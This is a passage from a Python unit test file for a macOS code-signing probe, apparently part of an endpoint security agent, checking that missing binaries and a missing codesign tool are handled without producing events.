    @patch("os.path.exists", return_value=False)
    def test_skips_missing_binaries(self, mock_exists, mock_platform):
        """Should skip binaries that don't exist on disk."""
        mock_platform.system.return_value = "Darwin"
        probe = CodeSigningProbe()
        events = probe.scan(_make_context())
        assert events == []

    @patch("amoskys.agents.proc.probes.platform")
    @patch("os.path.exists", return_value=True)
    @patch("subprocess.run", side_effect=FileNotFoundError("codesign not found"))
    def test_handles_codesign_missing(self, mock_run, mock_exists, mock_platform):
        """Should handle missing codesign tool gracefully."""
        mock_platform.system.return_value = "Darwin"
        probe = CodeSigningProbe()
        events = probe.scan(_make_context())
        assert events == []
